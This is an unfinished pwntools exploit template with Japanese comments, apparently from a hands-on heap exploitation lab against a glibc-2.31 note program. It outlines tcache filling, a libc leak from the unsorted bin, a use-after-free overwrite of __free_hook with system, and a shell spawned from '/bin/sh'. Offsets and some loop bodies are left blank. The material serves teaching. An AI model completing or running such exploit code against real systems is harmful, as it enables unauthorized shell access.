#!/usr/bin/python3
#-*-coding:utf-8-*-

# glibc-2.31用 

from pwn import *
context.arch = 'amd64'

############## Utils #################
def menu():
  _  = s.recvuntil('1: create note')
  _ += s.recvuntil('2: delete note')
  _ += s.recvuntil('3: edit note')
  _ += s.recvuntil('4: exit')
  _ += s.recvuntil('Command >> ')
  #print(_)
  return;

def create_note(size, data):
  s.sendline('1')                    # Command >> 1 ; 1. create noteをメニュー選択
  s.recvuntil('[*] Note data size:') # プロンプト読み取り
  s.sendline(str(size))              # Note data sizeを指定
  s.recvuntil('[*] Note data: ')     # プロンプト読み取り
  s.sendline(data)                   # 実際にデータを送る. 
  # 格納したノートのインデックスを読み取り, 整数データとして返す. 
  idx = s.recvline().strip().decode().split(':')[-1] 
  idx = int(idx)
  menu()
  return idx

def delete_note(idx):
  s.sendline('2')                    # Command >> 2; 2. delete noteをメニュー選択
  s.recvuntil('index: ')
  s.sendline(str(idx))               # 削除したいノートのインデックスを引数に指定 
  menu()
  return 


def edit_note(idx, data):
  s.sendline('3')                    # Command >> 3; 3. edit noteをメニュー選択
  s.recvuntil('index: ')
  s.sendline(str(idx))
  s.recvuntil('data: ')
  s.sendline(data)
  menu()
  return
 
def show_note(idx):
  s.sendline('4')                    # Command >> 4; 4. show noteをメニュー選択
  s.recvuntil('index: ')             # 閲覧したいノートのインデックスを指定. 
  s.sendline(str(idx))
  note = s.readline().strip().split(':')[-1]
  return note # ノートのデータを返す.

#### plt/got, rop gadgets, symbs addrs and consts ####
ofs_malloc_hook = 
ofs_free_hook   =
ofs_puts        = 
ofs_onegadget   = 
ofs_system      =

HOST, PORT = '172.17.0.2', 1337 
s = remote(HOST, PORT)
#s = process('./handson5')
menu()


## tcacheを使い潰してリストをいっぱいにしておく. (top併合防止に一つ余計にmallocしておくのを忘れない) 
for i in range(7):
  # idx 0 ~ 6で確保


# unsorted binにつなぐ用のチャンクを確保しておく. 
B = create_note(0x100, b'DUMMY\n') # dataは何でもよい. 

# idx 8が併合防止用のチャンクとなるが、あとでfree_hook経由でシェルを起動するために
# /bin/shを入れておくと楽. 
C = create_note(0x10, b'/bin/sh\x00\n')

for i in range(0x6, -1, -1):
  # tcacheに7つ全部つなぐ.



## show_noteでunsorted binに繋がっているチャンクを指定すると, main_arena->topのアドレスが返ってくる.
## 8回目にfreeしたチャンクはtcacheではなく, unsorted binに繋がっている. 
## main_arena->topのアドレスははgdb配下で, p/x &main_arena->topで確認しておくこと.  
leak = show_note() 
leak = u64(leak.strip()) # バイト列を整数値に変換する(余り気になくて良い)


## リークできたら, アドレス解決. 


## UAFで関数ポインタを書き換え(free_hook書き換える想定)



# __free_hook経由でシェルを起動. 
## idx 8に/bin/shを入れておいてfreeするのがおそらく楽. 
input('gdb?')
s.sendline('2')    # Command >> 2; delete noteからfree呼び出し. 
s.recvuntil(':')   # プロンプト読み取り. 
s.sendline(str(C)) # 関数ポインタ呼び出し, free_hookはsystemに変わっている. 
# shell起動. 
s.interactive()
